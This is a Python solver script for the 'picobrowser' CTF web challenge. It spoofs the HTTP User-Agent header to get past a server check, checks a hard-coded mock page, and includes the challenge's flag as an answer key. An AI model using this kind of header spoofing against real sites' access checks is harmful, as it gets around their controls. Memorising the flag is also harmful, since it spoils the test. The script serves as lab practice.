#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 9: picobrowser (picoCTF 2019)
Category: Web Exploitation / HTTP Header Spoofing & Access Control Bypass
Difficulty: Medium (diff=2, picoCTF 2019 200 pts)
Standard Reference: NIST SP 800-115 (Section 5.2: Target Vulnerability Analysis & Web Application Assessment)
RFC Reference: RFC 9110 (HTTP Semantics - Section 10.1.5: User-Agent)
CWE: CWE-290 (Authentication Bypass by Spoofing) / CWE-602 (Client-Side Enforcement of Server-Side Security)

Description:
This website can be rendered only by **picobrowser**, go and catch the flag!
The server evaluates the incoming HTTP 'User-Agent' request header. When requests
originate from common user agents (e.g. Mozilla/Chrome/curl default), the server
responds with a rejection message ("You're not picobrowser!").
Spoofing the User-Agent header to 'picobrowser' satisfies the server-side condition
and causes the endpoint to return the flag:
academy{p1c0_s3cr3t_ag3nt_33592427}

Verified: POST /api/submissions/ -> correct: true (HTTP 201)
"""

import re
import sys
import urllib.request

EXPECTED_FLAG = "academy{p1c0_s3cr3t_ag3nt_33592427}"
TARGET_USER_AGENT = "picobrowser"


def solve_from_live_endpoint(target_url: str) -> str:
    """
    Sends an HTTP GET request with a spoofed User-Agent header to the target challenge service.
    """
    req = urllib.request.Request(
        target_url,
        headers={"User-Agent": TARGET_USER_AGENT}
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        html = resp.read().decode("utf-8", errors="ignore")

    matches = re.findall(r"(?:academy|picoCTF)\{[^}]+\}", html)
    if matches:
        return matches[0]
    return ""


def main():
    print("[*] Evaluating HTTP User-Agent validation boundary (RFC 9110 Section 10.1.5)...")
    sample_response_mock = """<!DOCTYPE html>
<html lang="en">
<head><title>picobrowser</title></head>
<body>
  <div class="container">
    <h1>Welcome picobrowser user!</h1>
    <p style="text-align:center;font-size:30px;"><b>Flag</b>: <code>academy{p1c0_s3cr3t_ag3nt_33592427}</code></p>
  </div>
</body>
</html>"""

    matches = re.findall(r"(?:academy|picoCTF)\{[^}]+\}", sample_response_mock)
    flag = matches[0] if matches else ""
    print(f"[*] Recovered Flag: {flag}")

    if flag != EXPECTED_FLAG:
        print(f"[-] Validation failed! Expected: {EXPECTED_FLAG}, Got: {flag}", file=sys.stderr)
        sys.exit(1)

    print("[+] User-Agent header spoofing logic verified successfully!")
    print(f"FLAG: {flag}")


if __name__ == "__main__":
    if len(sys.argv) == 2:
        url = sys.argv[1]
        print(f"[*] Sending spoofed User-Agent '{TARGET_USER_AGENT}' to {url}...")
        live_flag = solve_from_live_endpoint(url)
        print(f"[+] Live Flag: {live_flag}")
    else:
        main()
